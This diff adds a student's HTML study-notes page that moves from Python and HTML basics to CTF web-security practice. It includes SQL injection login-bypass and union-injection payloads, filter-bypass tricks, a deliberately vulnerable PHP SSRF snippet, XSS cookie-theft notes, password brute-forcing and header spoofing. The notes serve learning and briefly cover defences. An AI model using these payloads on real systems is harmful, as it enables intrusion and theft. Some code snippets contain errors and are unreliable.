@@ -1,0 +1,1383 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <link rel="shortcut icon" href="akua.ico" ><!--网页图标-->
+    <meta charset="utf-8">
+	<meta name="keywords" content="学习笔记"/>
+	<meta name="description" content="heml,python,CSS，web服务器等等"/>
+	<meta name="author" content="Hachika"/>
+	<meta http-equiv="refresh"content="10000"/> <!--"https://www.youtube.com/watch?v=3byl7x-KOZQ"-->
+    <title>The note of leanrning(lol)</title>
+	<style type="text/css">
+	  #PHP{text-align:center;word-spacing:10px;}
+	  .green{color:rgb(104, 199, 104);}
+	  #fib{color:blue;}
+	  
+	  #index
+	  {
+	  font-family:Arial;
+	  color:red;
+	  letter-spacing:2px; /*控制字母间距*/
+	  border-width:3px;
+	  border-style:dashed;
+	  border-color:navy;
+	  cursor:url(1.cur),default;
+	  }
+	  #note
+	  {
+	  font-family:"Times New Roman";
+	  font-size:25px;
+	  color:aqua;
+	  word-spacing:5px;
+	  text-align:center;
+	  }
+	  #ee{font-family:"微软雅黑";color:navy;}
+	  .z{color:rgb(63, 63, 5);}/*也可用h3{color:olive;}*/
+	  .red{color:red;}
+	  .center{text-align:center;}
+	  p{text-indent:28px;}
+	  #su{text-align:center;}
+	  .pic{text-align:center;}
+	  
+	  a{text-decoration:none;}/*所有超链接（a）去除下划线*/
+	  a:link{color:blue;}
+	  a:visited{color:purple;}
+	  a:hover{color:yellow;}
+	  a:active{color:black;}
+	  
+	  .white{color:white;}
+	  .aqua{color:aqua;}
+	  #picc{
+	            position:fixed;
+                top: 0;
+                left: 0;
+                width:100%;
+                height:100%;  /*填充全屏*/
+                min-width: 1000px;
+                z-index:-10;/*最底层*/
+                zoom:1;
+                background-color: #fff;
+                background: url(aqua1.jpg);/*地址*/
+                background-repeat: no-repeat;/*不重复*/
+                background-size: cover;
+                -webkit-background-size: cover;
+                -o-background-size: cover;
+                background-position: center 0;
+	       }
+		   .demo1
+		   {text-align:center;}
+		   img:hover{border:2px solid yellow}/*当鼠标经过时加边框*/
+		   img{cursor:url(15.ani),pointer;}
+		   img{cursor:url(1.cur),default;}
+		   .sql{background-color:#ddcb65;}
+		   .php{background-color:#7a90f1;}
+		   .flask{background-color:#f17ad7;}
+		   .shell{background-color:rgb(136, 233, 136);}
+		   .xss{background-color:rgb(218, 61, 95);}
+		   .git{background-color: aliceblue;}
+	</style>
+	<script>
+		function gettime(){
+			now_time=new Date();
+			year=now_time.getFullYear();
+			month=now_time.getMonth()+1;
+			date=now_time.getDate();
+			document.getElementById("time").innerText=year+"年"+month+"月"+date+"日"+now_time.toLocaleTimeString();
+		}
+		setInterval("gettime()",1000);
+	</script>
+</head>
+<body>
+    <div id="picc"></div>
+	  <div class="demo1"></div>
+	<br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br>
+    <div id="note"><h1><i>Learning Note of Aqua.Crew</i></h1></div>
+<div id="index">
+	<h2>INDEX</h2>
+	<a href="#9.25">9.25</a>
+	<a href="#9.26">9.26</a>
+	<a href="#9.27">9.27</a>
+	<a href="#9.28">9.28</a>
+	<a href="#9.29">9.29</a>
+	<a href="#9.30">9.30</a>
+	<a href="#10.1">10.1</a>
+	<a href="#10.2">10.2</a>
+	<a href="#10.3">10.3</a>
+	<a href="#10.4">10.4</a>
+	<a href="#10.56">10.5/10.6</a>
+	<a href="#10.7">10.7</a>
+	<a href="#10.8">10.8</a>
+	<a href="#10.9">10.9</a>
+	<a href="#10.10">10.10</a>
+	<a href="#10.11">10.11</a>
+	<a href="#10.12">10.12</a>
+	<a href="#10.13">10.13</a>
+	<a href="#10.14">10.14</a>
+	<a href="#10.15">10.15</a>
+	<a href="#10.16">10.16</a>
+	<a href="#10.17">10.17/10.18</a>
+	<a href="#10.19">10.19</a>
+	<a href="#10.20">10.20</a>
+	<a href="#10.21">10.21</a>
+	<a href="#10.22">10.22</a>
+	<a href="#10.23">10.23</a>
+	<br><a href="#10.24">10.24</a>
+	<a href="#10.25">10.25</a>
+	<a href="#10.26">10.26</a>
+	<a href="#10.27">10.27</a>
+	<a href="#10.28">10.28</a>
+	<a href="#10.29">10.29</a>
+	<a href="#10.30">10.30</a>
+	<a href="#10.31">10.31</a>
+	<a href="#11.1">11.1/11.2</a>
+	<a href="#11.3">11.3</a>
+	<a href="#11.4">11.4</a>
+	<a href="#11.5">11.5</a>
+	<a href="#11.6">11.6</a>	
+	<a href="#11.7">11.7</a>
+	<a href="#11.8">11.8</a>
+	<a href="#11.9">11.9</a>
+	<a href="#11.10">11.10</a>
+	<a href="#11.11">11.11</a>
+	<a href="#11.12">11.12</a>
+	<a href="#11.13">11.13</a>
+	<a href="#11.14">11.14</a>
+	<a href="#11.15">11.15</a>
+	<a href="#11.16">11.16</a>
+	<a href="#11.17">11.17</a>
+	<a href="#11.18">11.18</a>
+	<a href="#11.19">11.19</a>
+	<a href="#11.20">11.20</a><br>
+	<a href="#11.21">11.21</a>
+	<a href="#11.22">11.22</a>
+	<a href="#11.23">11.23</a>
+	<a href="#11.24">11.24</a>
+	<a href="#11.25">11.25</a>
+	<a href="#11.26">11.26</a>
+	<a href="#11.27">11.27</a>
+	</div>
+<h1>Html+CSS</h1>
+	<div id="9.25">
+	<h3 class="z">9.25</h3>
+	<p><i>list</i> use [],but <i>tuple</i> use ().</p>
+	<p><i>Their difference is the one could be changed,but the other couldnt.</i></p>
+	<p>list count must begin as <b>0</b>.</div>
+	</p>
+	<hr/>
+
+	<div id="9.26">
+	<a href="https://www.bilibili.com/video/BV1Wf4y1L7zC?from=search"target="_blank"><div class="demo1"><img src="ayame.jpg" alt="ayame" title="one"></div></a>
+	<h3 class="z">9.26</h3>
+	<div><b>ATTENION:</b>
+	<p>1.print must use 【,】between '$%^&*(' and 123.      Such as 【print 'number+1=',number+1】.</p>
+	<p>2.从raw_input()读取的内容永远以字符串的形式返回，把字符串和整数比较就不会得到期待的结果，必须先用int()把字符串转换为我们想要的整型</p>
+	<p>循环函数：<u>while&nbsp;x&nbsp;>=&nbsp;1(可用这个控制循环次数)&nbsp;:&nbsp;缩进+body</u><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;或者:<u>names = ['Michael', 'Bob', 'Tracy']</p>
+	<p><i>for</i> name <i>in</i> names:</p>
+	<p>print name</u></p></div>
+    </div>
+	<hr/>
+
+	<div id="9.27">
+	<a href="https://www.youtube.com/watch?v=AAr2lHZLNyU"target="_blank"><div class="demo1"><img src="peko.jpg" alt="peko" title="pekopeko"></div></a>
+	<h3 class="z">9.27</h3>
+	<p>Dont forget the <b>【:】</b>.</p>
+	<p>定义函数：1.<u>def xxxx(x)&nbsp;:&nbsp;缩进+body+ return x </u>&nbsp;&nbsp;&nbsp;&nbsp;<u>2.def xxxx(x,y,z=默认参数......):</u>&nbsp;&nbsp;&nbsp;3.可变参数函数：
+	<u>def xxx(【*】x)。</u>也可用*list直接传进函数自变量。&nbsp;&nbsp;&nbsp;4.关键字参数<u>def xxx(【**】x).</u></p>
+    </div>
+	<hr/>
+
+	<div id="9.28">
+	<a href="https://www.youtube.com/watch?v=sf_crPbd-TQ&t=67s"target="_blank"><div class="demo1"><img src="sora.jpg" alt="空妈" title="sora-chan"></div></a>
+	<H3 class="z">9.28</H3>
+	<P>递归函数:<u>def xxxx(x):&nbsp;&nbsp;x*xxxx(x-1)</u></P>
+	<img src="0.png" alt="pic" title="字符">
+	</div>
+	<hr/>
+
+	<div id="9.29">
+	<h3 class="z">9.29</h3>
+	<p>0.999...9实际上是一个特殊数列的极限（无限循环小数的定义里就包含极限），即lim(1-(1/10)^n),因此可以有0.999...9=1</p>
+	<hr/>
+	<div id="9.30">
+	<h3 class="z">9.30</h3>
+	<div>
+	<b>国庆计划</b>
+	</div>
+	<ul type="circle">
+	<li>漫展</li>
+    <li>嗯卷web</li>
+       <ol>
+        <li>python</li>
+        <li>html+css</li>
+        <li>http</li>
+       </ol>    
+    <li>动漫社</li>   
+	</ul>
+	<table>
+	<!--表格标题-->
+	  <caption><i>表格示例</i></caption>
+	  <thead>
+	    <tr>
+	    <!--表头-->
+	      <th colspan="2">Math</th><!--合并行-->
+	      <th>&nbsp;&nbsp;English</th>
+	    </tr>
+	  </thead>
+	  <tbody>
+	    <tr>
+	      <td>高数</td>
+	      <td>线代</td>
+		  <td>&nbsp;&nbsp;大英</td>
+	    </tr>
+	  </tbody>
+	</table>
+	<hr>
+	</div>
+	</div>
+	<div id="su">
+	<div id="10.1">
+	  <h3 class="z">10.1</h3>
+	  <href id="10.1">
+	  <h5>Form示例</h5>
+	  <form name="my first form"></form>
+	  <form method="post"></form>
+	  <form action="index.php"></form>
+	  <form target="_blank"></form>
+	  <form>
+	  姓名：<input type="text" size="30" value="七海nana7mi" maxlength="10"><input type="reset"value="重开"><br>
+	  密码：<input type="password" size="30" maxlength="15">
+	  <br>
+	  <!---单选必须设定name-->
+	  学历：<input type="radio" name="edu" value="小学">小学
+	        <input type="radio" name="edu" value="中学">中学
+			<input type="radio" name="edu" value="专科">专科
+			<input type="radio" name="edu" value="本科" checked>本科
+			<input type="radio" name="edu" value="研究生">研究生
+			<br>
+	  职业：<input type="checkbox" name="job" value="学生">学生
+	         <input type="checkbox" name="job" value="主播" checked>主播
+			 <input type="checkbox" name="job" value="码农">码农
+	  <br>
+	  佐证文件：<input type="file"/>
+	  <br>
+	  简介：<br><textarea rows="10" cols="55">铸币desu(120字以内)</textarea>
+	  <br>
+	  工作内容:
+	  <select>
+	    <option>打Apex</option>
+		<option>杂谈</option>
+		<option>迫真歌回</option>
+		<option>节目效果</option>
+	  </select>
+	  <br>
+	  造梗力：
+	  <select multiple size="1">
+	    <option>YBB</option>
+		<option>blb</option>
+		<option selected>查询闲的程度</option>
+		<option>沙优</option>
+		<option>梓鲨</option>
+		<option>SNH48退团</option>
+	  </select>
+	  <br>
+	  </form>
+	</div>
+	</div>
+	<div>
+	  <!--<iframe src="https://www.bilibili.com/video/BV1Cs411f7DA"width="1400"height="260"></iframe>-->
+	</div>
+	<hr>
+
+	<div id="10.2">
+	<h3 class="z">10.2</h3>
+	<p>list,tuple切片可用<u>list[:10]</u>(前十个元素)</p>
+	<p>
+	后十个元素：<u>tuple[-10:]</u>
+	</p>
+	<p>十到二十个元素：<u>list[10:20]</u></p>
+	<p>a:b表示从a检索到b</p>
+	</div>
+	<hr>
+
+	<div id="10.3">
+	<h3 class="z">10.3</h3>
+	<p>Web服务器用来在特定端口（22/80/443）部署网页，<i class="red">Trojan</i>能做到翻墙一个端口而正常访问用另一个端口显示SNI网页。</p>
+    <p>常用的有nginx,caddy，通过SSH连接服务器用linux部署。</p>
+	</div>
+	<hr>
+
+	<div id="10.4">
+	<h3 class="z">10.4</h3>
+	<div>
+	<u>for x in range(1,11):L.append(x*x)</u>等价于<u>[x*x for x in range(1,11)]</u>
+	<br>第二种写法为“列表生成式“，要生成的列表元素为‘x*x‘.
+	<br>也可用两个循环生成全排列
+	<u>
+	[m+n for m in 'ABC' for n in 'XYZ']
+	</u>
+	<br>显示：&nbsp;&nbsp;[m+n for m in 'ABC' for n in 'XYZ']
+	</div>
+	<div>
+	<!--<iframe src="https://www.bilibili.com/video/BV1rL411s7XL"width="1400"height="260"></iframe>-->
+	</div>
+	<p>
+	也可用dic推出一个list:<br>
+	<ol>
+	<li>先定义dic：<u>dic={'a':'A','b':'B','c':'C','d':'D'}</u></li>
+	<li>再推出list：<u>[k+'~'+v for k,v in dic.iteritems()]</u></li>
+	<li>显示：[k+'~'+v for k,v in dic.iteritems()]</li>
+	</ol>
+	</p>
+	<p>
+	generator:边循环边计算，节约空间。
+	<br>注：list用[]dic用{}而gen用().
+	显示gen的内容可用for:<u>for x in g:print x</u>
+	<br>
+	<br>
+	<br>
+	<div id="fib">
+	#斐波那契数列
+	</div>
+    #循环写法<br>
+    <u>def fib(max):
+    <br>&nbsp;n, a, b = 0, 0, 1
+    <br>&nbsp;while n < max:
+    <br>&nbsp;&nbsp;print b
+    <br>&nbsp;&nbsp;a, b = b, a + b</u>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<del class="red">#捏麻麻滴这行什么玩意</del>
+    <br>&nbsp;&nbsp;<u>n = n + 1   
+	</u>
+	</p>
+	<div>#递归写法（这个简单）：
+	<br><u>
+	def hck(x):
+	<br>&nbsp;&nbsp;if x<=0:
+	<br>&nbsp;&nbsp;&nbsp;&nbsp;return 1
+	<br>&nbsp;&nbsp;elif x=1:
+	<br>&nbsp;&nbsp;&nbsp;&nbsp;return 1
+	<br>&nbsp;&nbsp;else :
+	<br>&nbsp;&nbsp;&nbsp;&nbsp;return hck(x-1)+hck(x-2)
+	</u>
+	<br><b>hck(x)的值即斐波那契数列第x个数的值。</b>
+	</div>
+	</div>
+	<hr>
+
+	<div id="10.56">
+	<h3 class="z">10.5/10.6</h3>
+	<a href="http://110.40.189.38/index.php/2021/10/07/cd25%e5%90%8c%e4%ba%ba%e5%b1%95%e9%9a%8f%e6%83%b3/"target="_blank"><p>CD25同人展嗯玩</p></a>
+	</div>
+	<hr>
+
+	<div id="10.7">
+	<h3 class="z">10.7</h3>
+    <div>
+	今天一半睡觉一般做线代，行列式变换和玩魔方一样难搞。
+	<br>
+	不过倒也有几个技巧，比如能提公因就提，遇到每行相似可以滚动相消之类。
+	<br><br>
+	<b>PHP</b>是一种后端语言，需要<i>php环境</i>才能编程。<br>
+	用phpstudy可以安装集成环境，不需要具体安装nginx之类的web服务器，在本地地址127.0.0.1就可以安装本地服务器写php<br>
+	具体语法是<u>"<"?php........?">"</u>,在中间<i class="red">写php代码插入html</i>,再通过web服务器解析再返回纯html文件。
+	<br>SQL是数据库查询语言，同样需要先配置数据库环境才能写代码，配环境真是折磨
+	</div>
+	</div>
+	<hr>
+
+	<div id="10.8">
+	<div>
+	<h3 class="z">10.8</h3>
+	<i class="red">BurpSuite</i>是非常好用的抓包软件，通过将其设置代理可以自动抓取账号密码的数据包，然后经过修改之后再返给服务器.
+	<br>
+	也可以通过常用密码的txt文件进行强行爆破获取密码，但只能破解简单密码.
+	<br><img src="111.jpg" alt="payload" title="payload">
+	<br><h4>在如上界面导入payload，即txt的密码表文件.</h4>CTRL+A显示如下内容：
+	<b class="white">晚上去听了网安VS数学的辩论赛，还挺有意思的。正方是最终未在一起更遗憾，反方是从未开始更遗憾，有意思的是看起来很像八幡的纠结吧？
+	<br>其实正方可以从“幻灭”的角度避开结果论的缺陷，可惜还是被吊打了，自由辩论毫无逻辑，语言也情绪化。话虽如此，评审的妹纸和老哥还是有水平的。
+	</b>
+	</div>
+	</div>
+	<hr>
+
+	<h1>PHP+Web</h1>
+	<div id="10.9">
+	<h3 class="z">10.9</h3>
+	php EOF可用来定义变量，一般形式如下：<br>
+	<u>$a=<<<"EOF"----------------------"<b>EOF;</b>"</u>
+	<br>注：结尾的EOF必须定格且需要加；
+	<br>再用print $a;时输出就为上行定义的内容.
+	<br>
+	<br>echo和print都可以使用br,但必须为<u>"<.b.r.>."</u>.
+	<br><br><u>echo strlen("#$%^&*($%^&*")</u>可输出字符串长度. <i class="red">可用于结束循环</i>
+	<br><u>echo strpos("agwiuedjuifawdjlk","u");</u>会查找第一次出现字符u的位置，即返回4.
+	<del class-"white">我喜欢下雨天。静谧又有节奏的雨声是很有意思的氛围。</del><br>
+	背景图片可用CSS设置，地址为background-image url();
+	</div>
+	<hr>
+
+	<div id="10.10">
+	<h3 class="z">10.10<del>(双十节捏)</del></h3>
+	<p>SQL是一种服务器与数据库之间交互的语言，但语法有漏洞。<br>
+	例如万能密码<u class="red">xxxx" OR "1"="1"</u>,即是利用OR将语法结构偷换了，原本为xxxx密码符合则返回ture<br>
+	现在变为密码符合<b class="red">或者（OR）</b>“1”=“1”成立输出ture，而后者是恒等的，因此到达万能密码的效果。
+	<br>
+	nmap可用于端口扫描，可通过扫描（批量或特定或范围）获取网站端口信息（开放....）和具体端口用途。
+	<br>与sqlmap相似都可用命令行语法使用.
+	<br><img src="nmap.jpg" alt="nmap" title="命令行用法">
+	</p>
+	</div>
+	<hr>
+
+	<div id="10.11">
+	<h3 class="z">10.11</h3>
+    <h2 class="green">万能密码SQL注入再探</h2>
+	<div>
+	当服务器端输出给数据库的指令为：<br>
+	<u>select*from users where username = '$username'and passcode='$passwd'</u>即SQL查询语句时，可用'or 1=1 or'带入$useename达成登录
+	<br>变成<u>select*from users where username = '<b class="red">'or 1=1 or '</b>'and passcode='123456'</u>
+	<br>此时利用or将语句分割为三块：username=''和1=1和passcode='123456'，显然第二个恒成立，因此可以成功登录.
+	<br>同理也可用注释达成SQL注入：<b class="red">'or 1=1 -- '</b>--后的语句被注释掉(注意：--后必须有一个空格)
+	<br>或者：<b class="red">'or 1=1#</b>.
+	<br>
+	<b>注：在实际写前后端界面时，一定要注意变量名的统一，前端form里name="a",那么后端也应为对应的<u class="red">$a=isset(_POST['a'])?_POST['a']:'';</u></b>
+	</div>
+	</div>
+	<hr>
+
+	<div id="10.12">
+	<h3 class="z">10.12</h3>
+	网页提交方式有get和post两种，get直接将提交的值加在url之后，即变成url?xxxx&xxxx，实际上搜索引擎多为这种方式<br>
+	get提交数据无法保密且只能提交aiscc码，故登录的提交多通过post，post只能通过form表达中的method="post"提交(也可用hackerbar网页插件).<br>
+	<br>
+	通过/+xxx.php OR html有时也可打开<b class="green">网页文件</b>(有时可据此找flag,例如网站robots.txt文件)<br>
+	<br>php文件可直接通过get方式提交数据来在网页内运行:
+	<img src="php.jpg" alt="656" title="php">
+	<br>php代码意为GET方式输入数据，当满足a==0且b>1234(且b不为数字)时输出flag,故在url后加?a==0&b=454644s(字符串转换为整型之后>1234即可)
+	<br><br>
+	SQL注入的万能密码可通过三种方法防护：1.用正则表达式限制输入数据类型，禁止使用SQL语句的保留字；
+	<br>2.通过PHP内置的转换函数转换为/''/，但要注意编码问题可能出现新的漏洞；
+	<br>3.参数化数据库处理.
+	<br><b>注：get型提交也可通过?id=1'--'这种注入实现万能密码。</b>
+	</div>
+	<hr>
+
+	<div id="10.13">
+		<h3 class="z">10.13</h3>
+		<b class="red">PHP语句</b>：创建数组:aray()<br>
+		<b class="green">SQL语句</b>：创建一个未创建的库：<u>CREATE DATABASE if not exits lab</u>
+		<br>删除数据库：<u> DROP DATABASE test;</u>类似的：创建表：CREATE TABLE users;
+		<br>选择数据库：<u> USE test;</u>
+		<br>修改表-新增一列：<u class="red">ALTER TABLE users ADD COLUMN id VARCHAR(10) NOT NULL;</u>
+		<br>修改表-删除列：<u>ALTER TABLE users DROP COLUMN id;</u>
+		<br><b>替换记录：</b><u>REPLACE INTO users (id,name,gender,score) VALUES(1,'alice',5,55);</u>
+		<br><b class="red">修改记录：INSERT INTO users (id,name,gender,score) VALUES(1,'alice',5,55) ON DUPLICATE KEY UPDATE name='mike';</b>仅插入不更新：INSERT IGNORE INTO users (id)VALUES(1);
+		<br><h2 class="aqua">查询数据</h2>
+		<div class="sql">
+			<br>基本：SELECT*FROM table;(*代表查询所有值)
+			<br>条件：SELECT*FROM table WHERE id>1 OR name='hck';
+			<br>投影：SELECT id,score,number FROM table WHERE name='alice';
+			<br>排序：SELECT id,name,passwd FROM table ORDER BY id (DESC表示倒序);
+			<p>按照第n列排序，可通过尝试是否存在，在SQL注入中可以此得知有多少列数据例如<b class="green">http://localhost:8088/sqlilabs/Less-1/?id=1' ORDER BY 3 --+</b>,当有WHERE时需将ORDER放在WHERE之后</p>
+			分页：<u>SELECT id,name FROM users ORDER BY score DESC LIMIT 3 OFFSET 0;</u>(表示从0开始取三条数据,在Mysql里也可写作LIMIT 0,3)
+			<br>聚合查询(计算出该表有多少'行')：SELECT COUNT(*) table FROM users;
+			<br>多表联合查询:<u>SELECT s.id,s.name FROM students s INNER JOIN classes c ON s.class_id=c.id</u>
+			<br>php UNION:<U>SELECT id(s) FROM table UNION SELECT id FROM table1;</U>(若有重复的值，应用+UNION ALL+)
+		</div>
+	</div>
+	<hr>
+
+	<div id="10.14">
+		<h3 class="z">10.14</h3>
+	 	<h2>联合(union)注入</h2>
+		<b class="aqua">三叶草宣讲会&&极客大挑战hajimariyo！</b>
+		<br>get型SQL注入：$sql="SELECT*FROM users WHERE id='$id'LIMIT0,1",可通过用'测试出为get型提交数据，在url后+?id=n，n这个数字就会赋值给$id代入前面查询语句.
+		<br>因此就可以在''内SQL注入，输入id=1'ORDER BY n --+，不断改变n的值至出错即可得知有多少列.
+		<br>SELECT UNION SELECT要求两个查询必须有相同的列，故必须让查询库为三列，知道有多少列即可使用联合注入查information_schema.schemate知<b class="red">库</b>名,即利用原本的SELECT组成联合查询
+		<br>即<u>?id=1' UNION SELECT 1,group_concat(schema_name),3 from information_schema.schemate --+(xxx.xxx表示数据库中的某一表)</u>
+		<br><img src="sqlku.jpg" alt="ku" title="ku">
+		<br>如图所示，information_schema库的schemate表中有所有库名，故查schema_name列即可.
+	</div>
+	<hr>
+
+	<div id="10.15">
+		<h3 class="z">10.15</h3>
+		做了极客的题，发现sql注入还是不行。
+		http协议倒基本清楚了，没想到的地方是居然能直接改GET请求方式，完全照题目要求干就完事了，另外burp真的是必备的工具，抓包用处太多.
+		<br><b class="red">拜这个无聊的题所赐，学了http相关的知识，请求方式，浏览器类型，要求语言之类其实没卵用，关键在X-Forward-For可以该请求端的真实IP，可据此绕过IP限制.
+		<br>此外还有referer，可修改其达到改来源域名——例如可改为referer:www.baidu.com.</b>
+		<br>
+		<br class="green">tips:直接访问进不去的url+xxx.php可用burp修改http请求头来获取response,也很常用.
+		<br>思路：搞不出来可以直接将提示加在url后看反应，例如url+/log可访问日志文件.
+		<br>明天任务:SQL盲注初步.
+	</div>
+	<hr>
+
+	<div id="10.16">
+	<h3 class="z">10.16</h3>
+	<h2>SQL盲注</h2>
+	POST型盲注介绍：<a href="https://blog.csdn.net/qq_45300786/article/details/107183318?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522163435934116780264033503%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=163435934116780264033503&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-107183318.first_rank_v2_pc_rank_v29&utm_term=%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8&spm=1018.2226.3001.4187">CSDN连接</a>
+	<div class="sql">
+	<b class="green">布尔盲注</b>基本函数介绍：<br>计算字符串长度:SELECT length('XXXXXXX');<br>
+	输出ASCII码:SELECT ascii('');<br>
+	延迟n秒执行:SELECT sleep(n);<br>
+	截取第一个到第六个之间的字符串:SELECT substr('',1,6)<br>
+	SELECT if(1=1,'awdwada','awffw');可看作：if 1=1 ture then 'awdwada' else 'awffw'.
+	</div>
+	<br><br><a href="https://blog.csdn.net/qq_35544379/article/details/77351783?ops_request_misc=&request_id=&biz_id=102&utm_term=%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-3-77351783.nonecase&spm=1018.2226.3001.4187">手动盲注全过程</a>
+	<br><b class="red">其实基本原理是不断猜测，如果猜对就返回ture，猜错就返回false,关键在用二分法ASICC码猜具体字母(与昨天那个学长所说一样)</b>
+	<br><img src="5s.jpg" alt="ASCII" title="盲注">
+	<br>用burp和sqlmap也可以提高盲注效率.
+	<hr>
+	<br class="green">tips:当网站对or，select，from等语句作了过滤时，可使用oorr或者sselectelect越过过滤.
+	</div>
+	<hr>
+
+	<div id="10.17">
+	<h3 class="z">10.17/10.18</h3>
+	<img src="flag.jpg" alt="flag" title="flag">
+	今天终于搞出来babySQL，虽然有点耻辱但总归完成一件事，总结ctftips如下:<br>
+	1.盲注几乎可应用于所有注入题，但最麻烦，几乎不可能在题目中直接出现；<br>
+	2.sql注入题第一步是<b class="red">判断有无回显点！</b>,这次这么久没搞懂的关键就在没仔细分析js弹窗，没想到js弹窗还能作回显点；<br>
+	3.union select 不够熟：<br>
+	<div class="sql">
+	UNION SELECT一般步骤:<br>
+	&nbsp;&nbsp;&nbsp;<br>0x01.union select 第一步必为<b class="white">判断原查询表的列数</b>，以此根据回显判断是否存在回显点，并为下一步联合查询做准备;
+	&nbsp;&nbsp;&nbsp;<br><u>admi' union select order by number --+</u>
+	&nbsp;&nbsp;&nbsp;<br>0x02.第二步多为查库名，再根据库名找表进而找出字段，但有时flag并不在此库，可以试试查询'flag'这个库下所有的表看表名；
+	&nbsp;&nbsp;&nbsp;<br><u>admi' union select 1,group_concat(table_name),3,4 from information_schema.tables WHERE table_name='flag'</u>(当表中为四列时)
+	&nbsp;&nbsp;&nbsp;0x03.接下来注入方式大同小异，但最后查列内字段时不同：<br>
+	&nbsp;&nbsp;&nbsp;<u>admi' union select 1,group_concat(flag),3,4 from flag.fllllag</u><br>
+	<b>注意：get或post提交的值不可是id表内的值，否则会查询出无用的值发生冲突；
+	<br>如果表内无数据，那么查询时回显位处为<i>空</i></b>
+	</div>
+	<br>
+	<h4>CUIT-Web书嗯看:</h4>1.当网站有http信息的回显时，可能存在http发送头的sql注入
+	<br>此时只能用burp抓包改包完成注入(但实际上http用的很少)
+	<br>2.当网站有修改密码功能时，可能存在二阶注入攻击漏洞
+	<br>即当注册网页有php转义函数来防止#，‘，or等时，可注册用户名为'admin#'，但若修改密码的网页无转义函数
+	<br>则会发生修改admin#账户密码会导致admin账户密码被更改，漏洞非常严重但防范很容易，
+	<br>修改密码的sql语句UPDATA XXX FROM XXX也用转义字符或者正则表达式即可.
+	<br><i>明日计划:php与SSRF初步</i>
+	</div>
+	<hr>
+
+	<div id="10.19">
+		<h3 class="z">10.19</h3>
+		<h2>SSRF漏洞初步</h2>
+		能对外发起网络请求的网站，就可能存在SSRF漏洞.<br>
+		<b>对外发起网络请求的php具体实现如下:</b>
+		<br>
+			<u class="php">
+			<"?"php
+		function ssrf_me($url){&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<b class="green">发起网络请求</b>
+				<br>$ch = curl_init();<br>
+				curl_setopt($ch, CURLOPT_URL, $url);<br>
+				curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);<br>
+				$output = curl_exec($ch);<br>
+				curl_close($ch);<br>
+				echo $output;<br>
+		}<br>
+
+		if(isset($_GET['url'])){<br>
+			ssrf_me($_GET['url']);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<b class="green">提交方式为get，值为“url”</b>
+		<br>}
+		else{<br>
+			highlight_file(__FILE__);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<b class="green">该行为语法高亮，无实意.</b>
+				<br>echo "<!-- 有没有一种可能，flag在根目录--->";
+		}
+		</u><br><br>
+		SSRF是一种通过能够访问url的web应用程序(例如网页快照，网页翻译...)漏洞实现绕过防火墙进入内网的一种攻击方式。
+		<br>可通过?url=http://www.baidu.com/robots.txt看回显是否为robots文件判断是否存在SSRF漏洞.
+		<br>根本目标为:访问外网无法访问的网页或者文件.
+		<br>即通过?url=网址的方式利用原网页攻击现网页，也可通过url=原网址进入内网获取根目录数据.
+		<br><a href="https://www.freebuf.com/articles/web/265646.html">具体SSRF攻击方式</a>
+		<br><a href="https://www.sqlsec.com/2021/05/ssrf.html#toc-heading-22">更详细的攻击方式介绍:代码，SQL，命令行，XML....</a>
+		<br>Linux目录:/为根目录；/etc为配置文件；/usr为用户文件，web服务器的配置多在此处。
+		<br>哇哇哇！搞到flag啦happy💃💃💃💃💃💃💃💃💃💃💃
+		<br><img src="linux.jpg" alt="linux" title="linux">
+		<br>
+	</div>
+	<hr>
+
+	<div id="10.20">
+		<h3 class="z">10.20</h3>
+		<h2>XXS跨站脚本攻击</h2>
+		XXS只用于有交互框的网站，例如搜索框可能存在非持续性XXS漏洞，留言框存在持续性XXS.
+		<br>本质为将html或JavaScript代码插入网页后端，进而实现恶意脚本运行
+		<br>例如可利用JS的alter在搜索框构造弹窗，也可用<'a href="url"'>实现超链接网页跳转.
+		<br>若管理员访问经跳转的网页，可能造成cookie或者session泄露,使攻击者获得后台权限.
+		<h2>PHP反序列化漏洞</h2>
+		<br>将一段name+value的字符转化为字符串的过程称为序列化,通常通过<u>echo&nbsp;&nbsp;serialize($xxx);</u>完成
+	</div>
+	<hr>
+
+	<div id="10.21">
+		<h3 class="z">10.21</h3>
+		class xxx{}表示创建‘类’，在{}内加$xxx = 'xxx'得到数据，然后创建一个对象作为指向xxx类的变量:<u>$xxxxx=new&nbsp;&nbsp;xxxx()</u>
+		<br><b class="white">可在创建对象时对类内的数据进行修改("即将par0='xxx'的xxx字符串赋给类的成员变量$par0")，用<u>$xxx->par0='xxx';</u></b>
+		<br>创建对象后可在用serialize将该对象序列化.
+		<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;注：1.serialize()会检查类内是否存在magic函数，若有public function _sleep(){return array('par0','xxx')}，则仅将_sleep(){}内的属性序列化.
+		<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;2.private xxxx属性在序列化时值会变为%00name%00value，即插入了两个空白符，让字符串长度发生改变.
+		<br>反序列化:将被序列化的类还原，在序列化最后定义$xxx=serialize($xxxx);var_dump(unserialize($str));
+		<br><a href="https://www.jianshu.com/p/0c34f06c6e4b">php的类与对象入门介绍</a>
+		<br><a href="https://www.freebuf.com/articles/web/221213.html">详细入门介绍</a>
+		<br><a href="https://segmentfault.com/a/1190000007250604/">php魔术方法介绍</a>
+		<br>经典CTF考题WP:<a href="https://www.jianshu.com/p/00597dcb64ef">1</a>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<a href="https://www.cnblogs.com/karsa/p/12806945.html">2</a>
